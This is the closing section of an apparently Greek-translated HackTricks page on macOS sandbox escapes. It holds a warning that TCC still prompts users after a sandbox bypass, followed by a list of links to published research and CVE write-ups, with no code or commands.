> [!WARNING] > **Ακόμα και αν παρακαμφθεί το Sandbox, το TCC** θα ρωτήσει τον χρήστη αν θέλει να επιτρέψει στη διεργασία να διαβάσει αρχεία από την επιφάνεια εργασίας

## References

- [1] [Jonathan Levin - Το Apple Sandbox: Βαθύτερα στον βούρκο (διαφάνειες HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Διαφυγή από το Mac App Store Sandbox](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Το Apple Sandbox: Βαθύτερα στον βούρκο (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Μια νέα εποχή διαφυγών από το macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Επεξήγηση: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Παράκαμψη του macOS TCC με Telegram μέσω DyLib Injection (Μέρος 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Διαφυγή από το Apple Sandbox μέσω εκκίνησης ενός εκτελέσιμου αρχείου](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec, αλλά για ενσωματωμένα profiles](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
